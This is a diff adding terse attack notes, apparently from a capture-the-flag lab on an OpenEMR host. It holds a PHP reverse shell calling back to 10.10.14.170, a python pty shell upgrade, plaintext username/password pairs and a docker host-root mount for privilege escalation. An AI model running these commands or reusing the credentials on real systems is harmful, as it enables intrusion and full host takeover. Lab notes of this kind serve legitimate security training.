@@ -159,3 +159,26 @@ Table: users
 
 [*] ending @ 22:42:22 /2020-06-06/
 openemr_admin:xxxxxx
+
+<?php
+exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.170/1337 0>&1'");
+?>
+
+echo "import pty; pty.spawn('/bin/bash')" > /tmp/asdf.py
+python3 /tmp/asdf.py
+
+ash
+H@v3_fun
+
+luffy
+0n3_p1ec3
+
+nothing afhj556uo
+
+docker run -v /:/mnt --rm -it ubuntu chroot /mnt bash
+run docker image ubuntu
+-v will mount a LOCAL DIR onto a DOCKER DIR (LOCALDIR:DOCKERDIR)
+chroot changes the apparent root directory for the current so chroot /DIR/THAT/IS/NEW/ROOT
+
+so mount local home onto docker /mnt and make /mnt the new root on the docker image
+--rm -it are just for cleanup
